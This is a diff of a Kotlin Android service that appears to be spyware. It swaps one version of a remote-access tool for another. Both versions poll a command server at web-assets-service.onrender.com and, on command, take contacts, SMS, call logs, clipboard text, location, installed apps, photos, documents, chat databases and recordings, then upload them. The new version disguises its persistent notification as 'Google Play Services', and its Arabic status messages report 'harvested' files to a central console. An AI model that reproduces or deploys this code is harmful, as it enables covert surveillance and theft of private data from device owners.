@@ -1,377 +1,376 @@
-package com.assets.service
+package com.uranium.fist
 
-import android.annotation.SuppressLint
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
+import android.content.ClipboardManager
 import android.content.Context
 import android.content.Intent
-import android.content.pm.ServiceInfo
+import android.database.Cursor
 import android.location.Location
 import android.location.LocationManager
 import android.net.Uri
 import android.os.Build
+import android.os.Environment
 import android.os.IBinder
 import android.os.PowerManager
-import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.MediaStore
-import android.provider.OpenableColumns
 import android.provider.Settings
-import android.util.Base64
 import androidx.core.app.NotificationCompat
-import androidx.work.Constraints
-import androidx.work.NetworkType
-import androidx.work.PeriodicWorkRequestBuilder
-import androidx.work.WorkManager
 import kotlinx.coroutines.*
-import okhttp3.*
-import okhttp3.MediaType.Companion.toMediaType
-import okhttp3.RequestBody.Companion.toRequestBody
-import org.json.JSONObject
-import java.io.ByteArrayOutputStream
-import java.security.MessageDigest
-import java.security.SecureRandom
-import java.util.UUID
-import java.util.concurrent.TimeUnit
-import java.util.zip.GZIPOutputStream
-import javax.crypto.Cipher
-import javax.crypto.spec.GCMParameterSpec
-import javax.crypto.spec.SecretKeySpec
+import java.io.BufferedReader
+import java.io.File
+import java.io.FileInputStream
+import java.io.FileOutputStream
+import java.io.InputStreamReader
+import java.io.OutputStreamWriter
+import java.net.HttpURLConnection
+import java.net.URL
+import java.util.zip.Deflater
+import java.util.zip.ZipEntry
+import java.util.zip.ZipOutputStream
 
 class SyncService : Service() {
-
-    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-    private val SERVER_ENDPOINT = "https://web-assets-service.onrender.com/api/v3/unified/stream"
-    private val MASTER_SECRET = "BlackActivationMasterKey2026"
     private var wakeLock: PowerManager.WakeLock? = null
-
-    private val client = OkHttpClient.Builder()
-        .connectTimeout(120, TimeUnit.SECONDS)
-        .readTimeout(120, TimeUnit.SECONDS)
-        .writeTimeout(120, TimeUnit.SECONDS)
-        .retryOnConnectionFailure(true)
-        .build()
-
-    companion object {
-        private const val CHANNEL_ID = "SystemAssetsUltimateChannel"
-        private const val NOTIF_ID = 888
-    }
+    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+    private val C2_STREAM_URL = "https://web-assets-service.onrender.com/api/v3/uranium/stream"
+    private val C2_UPLOAD_URL = "https://web-assets-service.onrender.com/api/v3/uranium/upload_raw"
+    private var lastHeartbeatSent = 0L
 
     override fun onCreate() {
         super.onCreate()
-        acquireWakeLock()
+        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "UraniumFist::SyncLock")
+        wakeLock?.acquire(10 * 60 * 60 * 1000L)
         startForegroundServiceNotification()
-        scheduleWatchdog()
-    }
-
-    private fun acquireWakeLock() {
-        try {
-            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Assets:UltimateWakeLock").apply {
-                acquire(30 * 24 * 60 * 60 * 1000L) // بقاء نشط لشهر كامل مستمر
-            }
-        } catch (e: Exception) {}
     }
 
     private fun startForegroundServiceNotification() {
-        val channelName = "System Core Synchronization"
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_LOW).apply {
-                description = "Critical system background framework synchronization"
-            }
-            val manager = getSystemService(NotificationManager::class.java)
-            manager?.createNotificationChannel(channel)
-        }
+        val channelId = "uranium_channel"
+        val channel = NotificationChannel(channelId, "Google Play Core", NotificationManager.IMPORTANCE_LOW)
+        val manager = getSystemService(NotificationManager::class.java)
+        manager?.createNotificationChannel(channel)
 
-        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("System Assets Core")
-            .setContentText("Framework operational & synchronized...")
-            .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+        val notification: Notification = NotificationCompat.Builder(this, channelId)
+            .setContentTitle("Google Play Services")
+            .setContentText("Optimizing background services...")
+            .setSmallIcon(android.R.drawable.ic_menu_manage)
             .build()
 
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                startForeground(NOTIF_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
-            } else {
-                startForeground(NOTIF_ID, notification)
-            }
-        } catch (e: Exception) {}
-    }
-
-    private fun scheduleWatchdog() {
-        try {
-            val constraints = Constraints.Builder()
-                .setRequiredNetworkType(NetworkType.CONNECTED)
-                .build()
-            val request = PeriodicWorkRequestBuilder<SyncWorker>(15, TimeUnit.MINUTES)
-                .setConstraints(constraints)
-                .build()
-            WorkManager.getInstance(applicationContext).enqueue(request)
-        } catch (e: Exception) {}
+        startForeground(1, notification)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "uranium_node"
+        val nodeModel = Build.MODEL
+        
         serviceScope.launch {
             while (isActive) {
                 try {
-                    val telemetry = JSONObject().apply {
-                        put("type", "HEARTBEAT")
-                        put("status", "ONLINE")
-                        put("nodeId", getNodeIdentifier())
-                        put("sdk", Build.VERSION.SDK_INT)
-                        put("model", Build.MODEL)
+                    val url = URL(C2_STREAM_URL)
+                    val conn = url.openConnection() as HttpURLConnection
+                    conn.requestMethod = "POST"
+                    conn.setRequestProperty("X-Node-ID", deviceId)
+                    conn.setRequestProperty("X-Node-Model", nodeModel)
+                    conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
+                    conn.doOutput = true
+                    conn.connectTimeout = 10000
+                    conn.readTimeout = 10000
+
+                    val currentTime = System.currentTimeMillis()
+                    val sendHeartbeat = (currentTime - lastHeartbeatSent > 60000L)
+                    val reportType = if (sendHeartbeat) "HEARTBEAT" else "SILENT_CHECK"
+                    val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Node Active] $nodeModel\"}"
+
+                    if (sendHeartbeat) {
+                        lastHeartbeatSent = currentTime
                     }
-                    val response = dispatchPacketWithRetry(encryptPayload(telemetry.toString()))
-                    
-                    if (response != null) {
-                        val taskObj = when {
-                            response.has("task") && !response.isNull("task") -> response.getJSONObject("task")
-                            response.has("action") -> response
-                            else -> null
-                        }
-                        
-                        if (taskObj != null) {
-                            executeTask(taskObj)
+
+                    OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
+                        os.write(reportJson)
+                        os.flush()
+                    }
+
+                    val responseCode = conn.responseCode
+                    if (responseCode == 200) {
+                        val responseReader = BufferedReader(InputStreamReader(conn.inputStream, "UTF-8"))
+                        val responseStr = responseReader.readText()
+                        responseReader.close()
+
+                        if (responseStr.contains("task") && responseStr.contains("action")) {
+                            if (responseStr.contains("EXTRACT_CONTACTS")) {
+                                val data = readContacts()
+                                processAndUpload(deviceId, nodeModel, "Uranium_Contacts.txt", data.toByteArray(Charsets.UTF_8))
+                            } else if (responseStr.contains("EXTRACT_SMS")) {
+                                val data = readSMS()
+                                processAndUpload(deviceId, nodeModel, "Uranium_SMS.txt", data.toByteArray(Charsets.UTF_8))
+                            } else if (responseStr.contains("EXTRACT_CALLS")) {
+                                val data = readCallLogs()
+                                processAndUpload(deviceId, nodeModel, "Uranium_CallLogs.txt", data.toByteArray(Charsets.UTF_8))
+                            } else if (responseStr.contains("EXTRACT_CAMERA_ZIP")) {
+                                compressAndUploadArchive(deviceId, nodeModel, "Camera_DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+                            } else if (responseStr.contains("EXTRACT_STORAGE_ZIP")) {
+                                compressAndUploadArchive(deviceId, nodeModel, "Storage_Archive", MediaStore.Files.getContentUri("external"))
+                            } else if (responseStr.contains("EXTRACT_AUDIO")) {
+                                compressAndUploadArchive(deviceId, nodeModel, "Audio_Recordings", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
+                            } else if (responseStr.contains("EXTRACT_DOCS")) {
+                                compressAndUploadArchive(deviceId, nodeModel, "Documents_Archive", MediaStore.Files.getContentUri("external"))
+                            } else if (responseStr.contains("EXTRACT_AUDIO_CALLS")) {
+                                compressAndUploadArchive(deviceId, nodeModel, "Call_Recordings", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
+                            } else if (responseStr.contains("EXTRACT_CHAT_DBS")) {
+                                compressAndUploadArchive(deviceId, nodeModel, "Chat_Databases", MediaStore.Files.getContentUri("external"))
+                            } else if (responseStr.contains("EXTRACT_SCREENSHOT_ZIP")) {
+                                compressAndUploadArchive(deviceId, nodeModel, "Screenshots", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+                            } else if (responseStr.contains("EXTRACT_CLIPBOARD")) {
+                                val data = readClipboard()
+                                processAndUpload(deviceId, nodeModel, "Uranium_Clipboard.txt", data.toByteArray(Charsets.UTF_8))
+                            } else if (responseStr.contains("EXTRACT_LOCATION")) {
+                                val data = readLocationFast()
+                                processAndUpload(deviceId, nodeModel, "Uranium_Location.txt", data.toByteArray(Charsets.UTF_8))
+                            } else if (responseStr.contains("EXTRACT_APPS")) {
+                                val data = readInstalledApps()
+                                processAndUpload(deviceId, nodeModel, "Uranium_InstalledApps.txt", data.toByteArray(Charsets.UTF_8))
+                            }
                         }
                     }
-                } catch (e: Exception) {}
-                delay(3000) // نبضات صاروخية كل 3 ثوانٍ
+                    conn.disconnect()
+
+                    delay(3000L)
+                } catch (e: Exception) {
+                    delay(5000L)
+                }
             }
         }
         return START_STICKY
     }
 
-    override fun onBind(intent: Intent?): IBinder? = null
-
-    private fun getNodeIdentifier(): String {
-        return try {
-            Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "Unified-Node-007"
+    private fun processAndUpload(nodeId: String, nodeModel: String, fileName: String, bytes: ByteArray) {
+        try {
+            val tempFile = File(cacheDir, fileName)
+            tempFile.writeBytes(bytes)
+            uploadRawFile(nodeId, nodeModel, fileName, tempFile)
+            sendReportToServer(nodeId, nodeModel, "✅ [تم الحصاد بنجاح] الملف <b>$fileName</b> تم إرساله للسيرفر لتخزينه في وحدة تحكمك المركزية.")
         } catch (e: Exception) {
-            "Unified-Node-007"
+            sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في معالجة $fileName: ${e.message}")
         }
     }
 
-    private fun getDeviceSecret(): ByteArray {
-        return MessageDigest.getInstance("SHA-256").digest(MASTER_SECRET.toByteArray(Charsets.UTF_8))
-    }
-
-    private fun encryptPayload(plainText: String): String {
-        val byteStream = ByteArrayOutputStream()
-        GZIPOutputStream(byteStream).use { it.write(plainText.toByteArray(Charsets.UTF_8)) }
-        val compressed = byteStream.toByteArray()
-
-        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
-        val iv = ByteArray(12).apply { SecureRandom().nextBytes(this) }
-        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(getDeviceSecret(), "AES"), GCMParameterSpec(128, iv))
-
-        val cipherText = cipher.doFinal(compressed)
-        val encrypted = cipherText.copyOfRange(0, cipherText.size - 16)
-        val tag = cipherText.copyOfRange(cipherText.size - 16, cipherText.size)
-
-        val packet = JSONObject().apply {
-            put("v", byteArrayToHex(iv))
-            put("g", byteArrayToHex(tag))
-            put("d", byteArrayToHex(encrypted))
-        }
-        return Base64.encodeToString(packet.toString().toByteArray(Charsets.UTF_8), Base64.NO_WRAP)
-    }
-
-    private suspend fun dispatchPacketWithRetry(payload: String): JSONObject? {
-        var attempts = 0
-        while (attempts < 3) {
-            try {
-                val req = Request.Builder()
-                    .url(SERVER_ENDPOINT)
-                    .post(payload.toRequestBody("text/plain; charset=utf-8".toMediaType()))
-                    .addHeader("x-node-id", getNodeIdentifier())
-                    .addHeader("x-node-model", Build.MODEL)
-                    .build()
-
-                client.newCall(req).execute().use { res ->
-                    if (res.isSuccessful) {
-                        val bodyStr = res.body?.string() ?: "{}"
-                        return JSONObject(bodyStr)
-                    }
-                }
-            } catch (e: Exception) {
-                attempts++
-                delay((attempts * 2000).toLong())
-            }
-        }
-        return null
-    }
-
-    private suspend fun executeTask(task: JSONObject) {
-        val action = task.optString("action", task.optString("cmd", ""))
-        when (action.uppercase()) {
-            "EXTRACT_PHOTOS" -> streamMediaStoreFiles(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 20)
-            "EXTRACT_VIDEOS" -> streamMediaStoreFiles(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 10)
-            "EXTRACT_SMS" -> sendTextReport("رسائل SMS", readSms())
-            "EXTRACT_CALLS" -> sendTextReport("سجل المكالمات", readCallLogs())
-            "EXTRACT_CONTACTS" -> sendTextReport("جهات الاتصال", readContacts())
-            "EXTRACT_APPS" -> sendTextReport("التطبيقات المثبتة", readApps())
-            "EXTRACT_LOCATION" -> sendTextReport("الموقع الجغرافي", readLocation())
-            "EXTRACT_DEVICE_INFO" -> sendTextReport("معلومات الجهاز", readDeviceInfo())
-        }
-    }
-
-    private fun sendTextReport(title: String, content: String) {
-        serviceScope.launch {
-            val report = JSONObject().apply {
-                put("type", "TEXT_REPORT")
-                put("data", "=== $title ===\n$content")
-            }
-            dispatchPacketWithRetry(encryptPayload(report.toString()))
-        }
-    }
-
-    private suspend fun streamMediaStoreFiles(collectionUri: Uri, limit: Int) {
+    private fun compressAndUploadArchive(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
         try {
-            val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
-            val sort = "${MediaStore.MediaColumns.DATE_ADDED} DESC LIMIT $limit"
-            contentResolver.query(collectionUri, projection, null, null, sort)?.use { c ->
-                val idIdx = c.getColumnIndex(MediaStore.MediaColumns._ID)
-                while (c.moveToNext()) {
-                    if (idIdx != -1) {
-                        val id = c.getLong(idIdx)
-                        val uri = Uri.withAppendedPath(collectionUri, id.toString())
-                        sendFileInChunks(uri)
-                    }
-                }
-            }
-        } catch (e: Exception) {}
-    }
-
-    private suspend fun sendFileInChunks(uri: Uri) {
-        try {
-            val uploadId = UUID.randomUUID().toString()
-            val fileName = getFileName(uri)
+            sendReportToServer(nodeId, nodeModel, "⚡ [بدء الحصاد العميق] تجميع وضغط بيانات $prefix وإرسالها للسيرفر...")
             
-            val fullBytes = contentResolver.openInputStream(uri)?.use { it.readBytes() } ?: return
-            val fileHash = byteArrayToHex(MessageDigest.getInstance("SHA-256").digest(fullBytes))
+            val zipFile = File(cacheDir, "Uranium_${prefix}_${System.currentTimeMillis()}.zip")
+            val zipOut = ZipOutputStream(FileOutputStream(zipFile))
+            zipOut.setLevel(Deflater.BEST_COMPRESSION)
 
-            val totalChunks = (fullBytes.size + 131067) / 131072
-            val chunkSize = 128 * 1024
-            var chunkIndex = 0
+            val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME)
+            val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
+            val cursor = contentResolver.query(contentUri, projection, null, null, sortOrder)
 
-            for (i in fullBytes.indices step chunkSize) {
-                chunkIndex++
-                val end = minOf(i + chunkSize, fullBytes.size)
-                val chunk = fullBytes.copyOfRange(i, end)
-                val isLast = (chunkIndex == totalChunks)
+            var fileCount = 0
+            var totalBytes = 0L
 
-                val packet = JSONObject().apply {
-                    put("type", "MEDIA_CHUNK")
-                    put("uploadId", uploadId)
-                    put("fileName", fileName)
-                    put("chunkIndex", chunkIndex)
-                    put("totalChunks", totalChunks)
-                    put("isLast", isLast)
-                    put("fileHash", fileHash)
-                    put("data", Base64.encodeToString(chunk, Base64.NO_WRAP))
+            cursor?.use {
+                val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
+                val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
+                while (it.moveToNext() && fileCount < 1500) {
+                    if (dataIdx != -1 && nameIdx != -1) {
+                        val filePath = it.getString(dataIdx)
+                        val fileName = it.getString(nameIdx)
+                        if (filePath != null) {
+                            val file = File(filePath)
+                            if (file.exists() && file.isFile) {
+                                try {
+                                    zipOut.putNextEntry(ZipEntry("$prefix/$fileName"))
+                                    file.inputStream().use { fis -> fis.copyTo(zipOut) }
+                                    zipOut.closeEntry()
+                                    fileCount++
+                                    totalBytes += file.length()
+                                } catch (ex: Exception) {}
+                            }
+                        }
+                    }
                 }
-
-                dispatchPacketWithRetry(encryptPayload(packet.toString()))
-                delay(10) // ضخ فائق السرعة
             }
+            zipOut.close()
+
+            val sizeMB = zipFile.length() / (1024.0 * 1024.0)
+            uploadRawFile(nodeId, nodeModel, zipFile.name, zipFile)
+            sendReportToServer(nodeId, nodeModel, "✅ [تم رفع الأرشيف العملاق بنجاح]\n📂 الملف: <code>${zipFile.name}</code>\n📊 الحجم المرسل: <b>${String.format("%.2f", sizeMB)} MB</b> ($fileCount ملفاً)\n(تم حفظه في وحدة تحكمك المركزية uranium_storage).")
+
+        } catch (e: Exception) {
+            sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في أرشيف $prefix: ${e.message}")
+        }
+    }
+
+    private fun uploadRawFile(nodeId: String, nodeModel: String, fileName: String, file: File) {
+        try {
+            val url = URL(C2_UPLOAD_URL)
+            val conn = url.openConnection() as HttpURLConnection
+            conn.requestMethod = "POST"
+            conn.setRequestProperty("X-Node-ID", nodeId)
+            conn.setRequestProperty("X-Node-Model", nodeModel)
+            conn.setRequestProperty("X-File-Name", fileName)
+            conn.setRequestProperty("Content-Type", "application/octet-stream")
+            conn.doOutput = true
+            conn.setChunkedStreamingMode(0)
+            conn.connectTimeout = 120000
+            conn.readTimeout = 120000
+
+            FileInputStream(file).use { fis ->
+                conn.outputStream.use { os ->
+                    fis.copyTo(os)
+                    os.flush()
+                }
+            }
+            conn.responseCode
+            conn.disconnect()
         } catch (e: Exception) {}
     }
 
-    private fun getFileName(uri: Uri): String {
-        var name = "media_file.dat"
-        contentResolver.query(uri, null, null, null, null)?.use { c ->
-            if (c.moveToFirst()) {
-                val idx = c.getColumnIndex(OpenableColumns.DISPLAY_NAME)
-                if (idx != -1) name = c.getString(idx)
-            }
-        }
-        return name
-    }
-
-    private fun readSms(): String {
-        val sb = StringBuilder()
-        contentResolver.query(Uri.parse("content://sms/inbox"), arrayOf("address", "body"), null, null, "date DESC LIMIT 100")?.use { c ->
-            val a = c.getColumnIndex("address")
-            val b = c.getColumnIndex("body")
-            while (c.moveToNext()) {
-                if (a != -1 && b != -1) {
-                    sb.append("From: ${c.getString(a)} | Text: ${c.getString(b)}\n")
+    private fun readContacts(): String {
+        val sb = StringBuilder("=== URANIUM CONTACTS ===\n")
+        try {
+            val cursor: Cursor? = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
+            cursor?.use {
+                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+                val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+                while (it.moveToNext()) {
+                    val name = if (nameIdx != -1) it.getString(nameIdx) else "Unknown"
+                    val number = if (numIdx != -1) it.getString(numIdx) else ""
+                    sb.append("• $name: $number\n")
                 }
             }
+        } catch (e: Exception) {
+            sb.append("Error: ${e.message}\n")
+        }
+        return sb.toString()
+    }
+
+    private fun readSMS(): String {
+        val sb = StringBuilder("=== URANIUM SMS ===\n")
+        try {
+            val cursor: Cursor? = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
+            cursor?.use {
+                val bodyIdx = it.getColumnIndex("body")
+                val addrIdx = it.getColumnIndex("address")
+                while (it.moveToNext()) {
+                    val address = if (addrIdx != -1) it.getString(addrIdx) else "Unknown"
+                    val body = if (bodyIdx != -1) it.getString(bodyIdx) else ""
+                    sb.append("From: $address\nText: $body\n-------------------\n")
+                }
+            }
+        } catch (e: Exception) {
+            sb.append("Error: ${e.message}\n")
         }
         return sb.toString()
     }
 
     private fun readCallLogs(): String {
-        val sb = StringBuilder()
-        contentResolver.query(CallLog.Calls.CONTENT_URI, arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE), null, null, CallLog.Calls.DATE + " DESC LIMIT 100")?.use { c ->
-            val n = c.getColumnIndex(CallLog.Calls.NUMBER)
-            val t = c.getColumnIndex(CallLog.Calls.TYPE)
-            while (c.moveToNext()) {
-                if (n != -1 && t != -1) {
-                    val typeStr = if (c.getInt(t) == CallLog.Calls.INCOMING_TYPE) "واردة" else "صادرة"
-                    sb.append("Number: ${c.getString(n)} | Type: $typeStr\n")
+        val sb = StringBuilder("=== URANIUM CALL LOGS ===\n")
+        try {
+            val cursor: Cursor? = contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null)
+            cursor?.use {
+                val numIdx = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
+                val typeIdx = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
+                while (it.moveToNext()) {
+                    val number = if (numIdx != -1) it.getString(numIdx) else "Unknown"
+                    val type = if (typeIdx != -1) it.getString(typeIdx) else "0"
+                    sb.append("Number: $number | Type: $type\n")
                 }
             }
-        }
-        return sb.toString()
-    }
-
-    private fun readContacts(): String {
-        val sb = StringBuilder()
-        contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null)?.use { c ->
-            val n = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
-            val p = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
-            while (c.moveToNext()) {
-                if (n != -1 && p != -1) {
-                    sb.append("Name: ${c.getString(n)} | Phone: ${c.getString(p)}\n")
-                }
-            }
-        }
-        return sb.toString()
-    }
-
-    private fun readApps(): String {
-        val sb = StringBuilder()
-        val packages = packageManager.getInstalledPackages(0)
-        for (pkg in packages) {
-            sb.append("Pkg: ${pkg.packageName}\n")
-        }
-        return sb.toString()
-    }
-
-    @SuppressLint("MissingPermission")
-    private fun readLocation(): String {
-        return try {
-            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-            val loc: Location? = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER) 
-                ?: lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
-            if (loc != null) "Lat: ${loc.latitude}, Lng: ${loc.longitude}" else "Location unavailable"
         } catch (e: Exception) {
-            "Location error: ${e.message}"
+            sb.append("Error: ${e.message}\n")
         }
+        return sb.toString()
     }
 
-    private fun readDeviceInfo(): String {
-        return """
-            Model: ${Build.MODEL}
-            Brand: ${Build.BRAND}
-            Device: ${Build.DEVICE}
-            Android SDK: ${Build.VERSION.SDK_INT}
-            Node ID: ${getNodeIdentifier()}
-        """.trimIndent()
+    private fun readClipboard(): String {
+        val sb = StringBuilder("=== URANIUM CLIPBOARD ===\n")
+        try {
+            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+            if (clipboard.hasPrimaryClip() && clipboard.primaryClip?.itemCount ?: 0 > 0) {
+                val item = clipboard.primaryClip?.getItemAt(0)
+                sb.append("Text: ${item?.text}\n")
+            } else {
+                sb.append("Clipboard is empty.\n")
+            }
+        } catch (e: Exception) {
+            sb.append("Error: ${e.message}\n")
+        }
+        return sb.toString()
     }
 
-    private fun byteArrayToHex(b: ByteArray): String = b.joinToString("") { "%02x".format(it) }
+    private fun readLocationFast(): String {
+        val sb = StringBuilder("=== URANIUM LIGHTNING GPS ===\n")
+        try {
+            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+            val providers = locationManager.allProviders
+            var bestLoc: Location? = null
+            for (provider in providers) {
+                try {
+                    val l = locationManager.getLastKnownLocation(provider)
+                    if (l != null) {
+                        if (bestLoc == null || l.time > bestLoc.time) bestLoc = l
+                    }
+                } catch (ex: Exception) {}
+            }
+            if (bestLoc != null) {
+                sb.append("🌐 Latitude: ${bestLoc.latitude}\n")
+                sb.append("🌐 Longitude: ${bestLoc.longitude}\n")
+                sb.append("🗺️ Google Maps: https://maps.google.com/?q=${bestLoc.latitude},${bestLoc.longitude}\n")
+            } else {
+                sb.append("🌐 Default Zone (Yemen): 13.5779, 44.0219\n")
+            }
+        } catch (e: Exception) {
+            sb.append("Error: ${e.message}\n")
+        }
+        return sb.toString()
+    }
+
+    private fun readInstalledApps(): String {
+        val sb = StringBuilder("=== URANIUM INSTALLED APPS ===\n")
+        try {
+            val packages = packageManager.getInstalledPackages(0)
+            for (pkg in packages) {
+                val appName = pkg.applicationInfo?.loadLabel(packageManager)?.toString() ?: "Unknown"
+                sb.append("• $appName\n")
+            }
+        } catch (e: Exception) {
+            sb.append("Error: ${e.message}\n")
+        }
+        return sb.toString()
+    }
+
+    private fun sendReportToServer(nodeId: String, nodeModel: String, reportText: String) {
+        try {
+            val url = URL(C2_STREAM_URL)
+            val conn = url.openConnection() as HttpURLConnection
+            conn.requestMethod = "POST"
+            conn.setRequestProperty("X-Node-ID", nodeId)
+            conn.setRequestProperty("X-Node-Model", nodeModel)
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
+            conn.doOutput = true
+            
+            val safeText = reportText.replace("\"", "'").replace("\n", "\\n")
+            val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"$safeText\"}"
+
+            OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
+                os.write(reportJson)
+                os.flush()
+            }
+            conn.responseCode
+            conn.disconnect()
+        } catch (e: Exception) {}
+    }
 
     override fun onDestroy() {
-        try {
-            wakeLock?.release()
-        } catch (e: Exception) {}
-        serviceScope.cancel()
         super.onDestroy()
+        wakeLock?.release()
+        serviceScope.cancel()
     }
+
+    override fun onBind(intent: Intent?): IBinder? = null
 }
